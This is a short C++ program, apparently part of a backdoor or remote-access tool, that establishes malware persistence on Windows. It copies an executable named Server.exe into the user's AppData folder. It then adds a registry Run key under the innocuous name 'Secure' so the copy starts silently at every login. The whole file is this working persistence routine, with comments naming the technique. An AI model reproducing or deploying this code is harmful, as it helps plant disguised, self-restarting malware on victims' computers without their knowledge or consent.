#include <iostream>
#include <fstream>
using namespace std;

int main() {
	system("cmd /c copy .\\Server.exe %appdata%");  
	// copy executable to appdata
	system("cmd /c REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /V \"Secure\" /t REG_SZ /F /D \"%appdata%\\Server.exe"); 
	//add registry persistence
}